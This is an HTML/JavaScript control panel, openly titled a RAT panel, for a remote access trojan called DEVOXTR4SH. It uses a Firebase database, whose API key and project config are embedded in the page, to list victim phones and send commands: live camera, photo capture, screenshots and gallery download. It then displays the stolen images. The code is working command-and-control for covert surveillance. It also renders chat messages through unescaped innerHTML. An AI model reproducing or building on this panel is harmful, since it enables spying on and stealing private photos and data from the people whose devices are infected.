<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>DEVOXTR4SH · RAT Panel</title>
  
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet" />
  
  <script type="importmap">
    {
      "imports": {
        "firebase/app": "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js",
        "firebase/database": "https://www.gstatic.com/firebasejs/12.17.1/firebase-database.js",
        "firebase/storage": "https://www.gstatic.com/firebasejs/12.17.1/firebase-storage.js"
      }
    }
  </script>

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
    body { background: #0b0b0b; color: #e0e0e0; display: flex; justify-content: center; padding: 12px; min-height: 100vh; }
    .app-container { max-width: 480px; width: 100%; background: #121212; border-radius: 32px; padding: 16px 14px 80px; box-shadow: 0 0 30px rgba(255, 0, 0, 0.15); position: relative; border: 1px solid #2a0a0a; }
    .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; position: relative; }
    .menu-icon { font-size: 32px; color: #ff3b3b; cursor: pointer; transition: 0.2s; user-select: none; }
    .menu-icon:hover { color: #ff6b6b; }
    .app-title { font-size: 22px; font-weight: 700; letter-spacing: 2px; background: linear-gradient(135deg, #ff1a1a, #cc0000); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 0 0 20px rgba(255, 0, 0, 0.3); }
    .refresh-btn { background: none; border: none; color: #ff3b3b; font-size: 28px; cursor: pointer; transition: 0.3s; }
    .refresh-btn:active { transform: rotate(180deg); }
    .navbar { display: flex; justify-content: space-around; background: #1c1c1c; padding: 10px 0; border-radius: 60px; margin: 12px 0 16px; border: 1px solid #2d2d2d; }
    .nav-item { color: #888; font-size: 14px; font-weight: 600; display: flex; flex-direction: column; align-items: center; gap: 2px; cursor: pointer; transition: 0.2s; padding: 4px 14px; border-radius: 40px; }
    .nav-item.active { color: #ff3b3b; background: #2a0a0a; }
    .nav-item .material-icons { font-size: 24px; }
    .device-card { background: #1a1a1a; border-radius: 24px; padding: 14px 16px; margin: 12px 0; border-left: 4px solid #ff3b3b; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 4px 12px rgba(255, 0, 0, 0.08); transition: 0.2s; }
    .device-card:hover { background: #222; }
    .device-info { display: flex; flex-direction: column; gap: 2px; flex: 1; }
    .device-name { font-weight: 700; font-size: 18px; color: #fff; letter-spacing: 0.3px; }
    .device-meta { display: flex; align-items: center; gap: 12px; font-size: 13px; color: #aaa; }
    .device-meta .material-icons { font-size: 18px; color: #ff3b3b; }
    .battery-wrap { display: flex; align-items: center; gap: 4px; background: #2a2a2a; padding: 2px 10px 2px 6px; border-radius: 30px; }
    .arrow-btn { color: #ff3b3b; font-size: 32px; cursor: pointer; transition: 0.2s; }
    .arrow-btn:active { transform: translateX(4px); }
    .control-panel { background: #1a1a1a; border-radius: 28px; padding: 18px 14px; margin: 14px 0; border: 1px solid #2d0a0a; display: none; }
    .control-panel.open { display: block; }
    .ctrl-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .ctrl-btn { background: #242424; border: none; border-radius: 40px; padding: 14px 6px; color: #ddd; font-weight: 600; font-size: 13px; display: flex; flex-direction: column; align-items: center; gap: 4px; transition: 0.15s; cursor: pointer; box-shadow: 0 2px 0 #0a0a0a; }
    .ctrl-btn .material-icons { font-size: 28px; color: #ff3b3b; }
    .ctrl-btn:active { transform: scale(0.95); background: #2f2f2f; }
    .ctrl-btn.danger { border: 1px solid #cc0000; }
    .chat-box { background: #111; border-radius: 20px; padding: 12px; margin-top: 16px; max-height: 200px; overflow-y: auto; border: 1px solid #2a2a2a; }
    .chat-msg { display: flex; gap: 8px; margin-bottom: 10px; font-size: 14px; }
    .chat-msg .sender { color: #ff3b3b; font-weight: 700; }
    .chat-msg .text { color: #ccc; word-break: break-word; }
    .chat-input-wrap { display: flex; gap: 8px; margin-top: 10px; }
    .chat-input-wrap input { flex: 1; background: #1e1e1e; border: 1px solid #333; padding: 12px 14px; border-radius: 60px; color: #fff; outline: none; }
    .chat-input-wrap button { background: #ff3b3b; border: none; padding: 0 18px; border-radius: 60px; color: #000; font-weight: 700; cursor: pointer; }
    .sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #0f0f0f; border-right: 2px solid #2a0a0a; padding: 30px 20px; transition: 0.3s cubic-bezier(0.2, 0.9, 0.3, 1); z-index: 999; box-shadow: 4px 0 30px rgba(0,0,0,0.8); }
    .sidebar.open { left: 0; }
    .sidebar .close-side { color: #ff3b3b; font-size: 32px; cursor: pointer; float: right; }
    .sidebar ul { list-style: none; margin-top: 40px; }
    .sidebar ul li { padding: 14px 0; border-bottom: 1px solid #1e1e1e; color: #ccc; font-weight: 500; display: flex; align-items: center; gap: 12px; cursor: pointer; }
    .sidebar ul li .material-icons { color: #ff3b3b; }
    .overlay { position: fixed; top:0;left:0;width:100%;height:100%; background: rgba(0,0,0,0.6); z-index: 998; display: none; }
    .overlay.open { display: block; }
    ::-webkit-scrollbar { width: 4px; }
    ::-webkit-scrollbar-track { background: #1a1a1a; }
    ::-webkit-scrollbar-thumb { background: #ff3b3b; border-radius: 10px; }
    .online-dot { display: inline-block; width: 10px; height: 10px; background: #00ff88; border-radius: 50%; margin-right: 6px; box-shadow: 0 0 12px #00ff88; }
  </style>
</head>
<body>

<div class="overlay" id="overlay"></div>
<div class="sidebar" id="sidebar">
  <span class="close-side material-icons" id="closeSide">close</span>
  <ul>
    <li><span class="material-icons">home</span> HOME</li>
    <li><span class="material-icons">devices</span> DEVICE</li>
    <li><span class="material-icons">settings_remote</span> CONTROL</li>
    <li><span class="material-icons">chat</span> GLOBAL CHAT</li>
    <li><span class="material-icons">info</span> ABOUT</li>
    <li><span class="material-icons">logout</span> LOGOUT</li>
  </ul>
  <div style="position:absolute;bottom:30px;color:#555;font-size:12px;">DEVOXTR4SH v2.0</div>
</div>

<div class="app-container" id="app">
  <div class="header">
    <span class="menu-icon material-icons" id="menuToggle">menu</span>
    <span class="app-title">DEVOXTR4SH</span>
    <span class="refresh-btn material-icons" id="refreshBtn">refresh</span>
  </div>

  <div class="navbar" id="navbar">
    <div class="nav-item active" data-tab="home"><span class="material-icons">home</span> HOME</div>
    <div class="nav-item" data-tab="device"><span class="material-icons">devices</span> DEVICE</div>
    <div class="nav-item" data-tab="control"><span class="material-icons">settings_remote</span> CONTROL</div>
  </div>

  <div id="deviceList"></div>

  <div class="control-panel" id="controlPanel">
    <h4 style="color:#ff3b3b; margin-bottom:12px; display:flex; gap:8px; align-items:center;">
      <span class="material-icons">devices</span> <span id="selectedDeviceName">Device</span>
    </h4>
    <div class="ctrl-grid">
      <button class="ctrl-btn" data-action="livecam"><span class="material-icons">videocam</span> Live Cam</button>
      <button class="ctrl-btn" data-action="takephoto"><span class="material-icons">photo_camera</span> Take Photo</button>
      <button class="ctrl-btn" data-action="screenshot"><span class="material-icons">screenshot</span> Screenshot</button>
      <button class="ctrl-btn" data-action="strobe"><span class="material-icons">flash_on</span> Strobe</button>
      <button class="ctrl-btn" data-action="flashlight"><span class="material-icons">flashlight_on</span> Flashlight</button>
      <button class="ctrl-btn" data-action="playsound"><span class="material-icons">volume_up</span> Play Sound</button>
      <button class="ctrl-btn" data-action="vibrate"><span class="material-icons">vibration</span> Vibrate</button>
      <button class="ctrl-btn danger" data-action="downloadgallery"><span class="material-icons">folder_download</span> Galeri</button>
    </div>
    <div id="previewArea" style="margin-top:16px; background:#0d0d0d; border-radius:20px; padding:10px; min-height:80px; text-align:center; color:#888; font-size:13px; border:1px dashed #333;">
      <span>📷 Preview / hasil akan tampil di sini</span>
    </div>
  </div>

  <div style="margin-top:20px;">
    <div style="display:flex; gap:6px; align-items:center; margin-bottom:6px;">
      <span class="material-icons" style="color:#ff3b3b;">chat</span>
      <span style="font-weight:600;">GLOBAL CHAT</span>
    </div>
    <div class="chat-box" id="chatBox"></div>
    <div class="chat-input-wrap">
      <input type="text" id="chatInput" placeholder="Pesan ke semua..." />
      <button id="chatSendBtn">Kirim</button>
    </div>
  </div>
</div>

<script type="module">
  import { initializeApp } from "firebase/app";
  import { getDatabase, ref, onValue, push, set, get, remove } from "firebase/database";
  import { getStorage } from "firebase/storage";

  const firebaseConfig = {
    apiKey: "AIzaSyAV5qFI5J0cZd0eg2Q6mhEZ0KEiR1URv1c",
    authDomain: "project-coding-gabut.firebaseapp.com",
    databaseURL: "https://project-coding-gabut-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "project-coding-gabut",
    storageBucket: "project-coding-gabut.firebasestorage.app",
    messagingSenderId: "234910334669",
    appId: "1:234910334669:web:7eacb5a07d37327cf2b384"
  };
  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);
  const storage = getStorage(app);

  let devices = {};
  let selectedDeviceId = null;
  let pairingId = generatePairingId();

  function generatePairingId() {
    return 'DEV-' + Math.random().toString(16).substring(2, 10).toUpperCase();
  }

  function copyPairingId() {
    const text = pairingId || 'DEV-XXXXXX';
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(() => feedbackCopy()).catch(() => fallbackCopy(text));
    } else {
      fallbackCopy(text);
    }
  }

  function fallbackCopy(text) {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    feedbackCopy();
  }

  function feedbackCopy() {
    const btn = document.getElementById('copyPairingBtn');
    if (!btn) return;
    btn.innerText = 'check';
    btn.style.color = '#00ff88';
    setTimeout(() => {
      btn.innerText = 'content_copy';
      btn.style.color = '#ff3b3b';
    }, 2000);
  }

  function renderDevices() {
    const container = document.getElementById('deviceList');
    if (!container) return;
    const keys = Object.keys(devices);
    if (keys.length === 0) {
      container.innerHTML = `
        <div style="text-align:center;color:#555;padding:40px 0;background:#141414;border-radius:24px;border:1px solid #2a0a0a;">
          <span style="font-size:48px;display:block;margin-bottom:12px;">📡</span>
          Belum ada device terhubung.<br>
          <div style="display:flex;align-items:center;justify-content:center;gap:12px;margin-top:14px;background:#1a1a1a;padding:10px 16px;border-radius:60px;max-width:300px;margin-left:auto;margin-right:auto;border:1px solid #2d2d2d;">
            <strong style="color:#ff3b3b;font-size:18px;letter-spacing:1px;">${pairingId}</strong>
            <span class="material-icons" id="copyPairingBtn" style="color:#ff3b3b;cursor:pointer;font-size:24px;transition:0.2s;">content_copy</span>
          </div>
          <span style="font-size:12px;color:#666;display:block;margin-top:8px;">Klik ikon copy untuk salin Pairing ID</span>
        </div>
      `;
      document.getElementById('copyPairingBtn')?.addEventListener('click', copyPairingId);
      return;
    }
    let html = '';
    keys.forEach(id => {
      const d = devices[id];
      const batteryIcon = d.battery >= 70 ? 'battery_full' : d.battery >= 30 ? 'battery_alert' : 'battery_0';
      const online = d.online !== false;
      html += `
        <div class="device-card" data-deviceid="${id}">
          <div class="device-info">
            <div class="device-name">${d.name || 'Unknown Device'}</div>
            <div class="device-meta">
              <span>${d.version || 'v1.0'}</span>
              <span class="battery-wrap">
                <span class="material-icons">${batteryIcon}</span> ${d.battery || 0}%
              </span>
              ${online ? '<span class="online-dot"></span>' : '<span style="color:#888;">● offline</span>'}
            </div>
          </div>
          <span class="arrow-btn material-icons" data-deviceid="${id}">chevron_right</span>
        </div>
      `;
    });
    container.innerHTML = html;
    document.querySelectorAll('.arrow-btn').forEach(btn => {
      btn.addEventListener('click', (e) => {
        const id = e.currentTarget.dataset.deviceid;
        if (id) selectDevice(id);
      });
    });
  }

  function selectDevice(deviceId) {
    selectedDeviceId = deviceId;
    const panel = document.getElementById('controlPanel');
    panel.classList.add('open');
    const name = devices[deviceId]?.name || 'Device';
    document.getElementById('selectedDeviceName').innerText = name;
    document.querySelectorAll('.device-card').forEach(c => c.style.borderLeftColor = '#2a2a2a');
    const card = document.querySelector(`.device-card[data-deviceid="${deviceId}"]`);
    if (card) card.style.borderLeftColor = '#ff3b3b';
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="control"]')?.classList.add('active');
  }

  const devicesRef = ref(db, 'devices');
  onValue(devicesRef, (snapshot) => {
    const data = snapshot.val();
    devices = data || {};
    renderDevices();
    if (selectedDeviceId && !devices[selectedDeviceId]) {
      document.getElementById('controlPanel').classList.remove('open');
      selectedDeviceId = null;
    }
  });

  const chatRef = ref(db, 'chat');
  onValue(chatRef, (snapshot) => {
    const data = snapshot.val();
    const box = document.getElementById('chatBox');
    if (!box) return;
    box.innerHTML = '';
    if (data) {
      const msgs = Object.values(data).slice(-30);
      msgs.forEach(msg => {
        const div = document.createElement('div');
        div.className = 'chat-msg';
        div.innerHTML = `<span class="sender">${msg.sender || 'anon'}:</span><span class="text">${msg.text || ''}</span>`;
        box.appendChild(div);
      });
      box.scrollTop = box.scrollHeight;
    }
  });

  document.getElementById('chatSendBtn')?.addEventListener('click', () => {
    const input = document.getElementById('chatInput');
    const text = input.value.trim();
    if (!text) return;
    push(chatRef, { sender: pairingId || 'Unknown', text, timestamp: Date.now() });
    input.value = '';
  });

  document.querySelectorAll('.ctrl-btn').forEach(btn => {
    btn.addEventListener('click', async (e) => {
      const action = e.currentTarget.dataset.action;
      if (!selectedDeviceId) {
        alert('Pilih device dulu cuy!');
        return;
      }
      const cmdRef = ref(db, `commands/${selectedDeviceId}`);
      await set(cmdRef, { action, from: pairingId, timestamp: Date.now() });
      const preview = document.getElementById('previewArea');
      preview.innerHTML = `<span style="color:#ff3b3b;">✔ Perintah "${action}" dikirim ke ${devices[selectedDeviceId]?.name || 'device'}</span>`;
      if (['takephoto', 'screenshot', 'livecam'].includes(action)) {
        listenResponse(selectedDeviceId, action);
      }
    });
  });

  function listenResponse(deviceId, action) {
    const respRef = ref(db, `responses/${deviceId}`);
    const unsub = onValue(respRef, (snapshot) => {
      const data = snapshot.val();
      if (data && data.action === action) {
        const preview = document.getElementById('previewArea');
        if (data.imageUrl) {
          preview.innerHTML = `<img src="${data.imageUrl}" style="max-width:100%;max-height:220px;border-radius:16px;border:1px solid #333;" />`;
        } else if (data.message) {
          preview.innerHTML = `<span>${data.message}</span>`;
        }
        remove(respRef);
        unsub();
      }
    }, { onlyOnce: true });
    setTimeout(() => unsub(), 15000);
  }

  document.getElementById('refreshBtn')?.addEventListener('click', () => {
    renderDevices();
    document.getElementById('previewArea').innerHTML = `<span>🔄 Refresh done.</span>`;
  });

  const sidebar = document.getElementById('sidebar');
  const overlay = document.getElementById('overlay');
  document.getElementById('menuToggle')?.addEventListener('click', () => {
    sidebar.classList.add('open');
    overlay.classList.add('open');
  });
  document.getElementById('closeSide')?.addEventListener('click', () => {
    sidebar.classList.remove('open');
    overlay.classList.remove('open');
  });
  overlay?.addEventListener('click', () => {
    sidebar.classList.remove('open');
    overlay.classList.remove('open');
  });

  document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', () => {
      document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
      item.classList.add('active');
      const tab = item.dataset.tab;
      if (tab === 'control' && selectedDeviceId) {
        document.getElementById('controlPanel').classList.add('open');
      } else if (tab === 'home') {
        document.getElementById('controlPanel').classList.remove('open');
      }
    });
  });

  const controllerRef = ref(db, `controllers/${pairingId}`);
  set(controllerRef, { name: 'DEVOXTR4SH', paired: true, timestamp: Date.now() });

  const demoDevices = {
    'DEV-A1B2C3': { name: 'Samsung A52', version: 'Android 13', battery: 78, online: true },
    'DEV-D4E5F6': { name: 'iPhone 14 Pro', version: 'iOS 17.2', battery: 43, online: true },
    'DEV-G7H8I9': { name: 'Redmi Note 11', version: 'MIUI 14', battery: 12, online: false }
  };
  get(devicesRef).then(snap => {
    if (!snap.exists()) {
      set(devicesRef, demoDevices);
    }
  });

  setInterval(() => renderDevices(), 10000);
  console.log('🚀 DEVOXTR4SH RAT Panel siap ngegas! Pairing ID:', pairingId);
</script>
</body>
  </html>
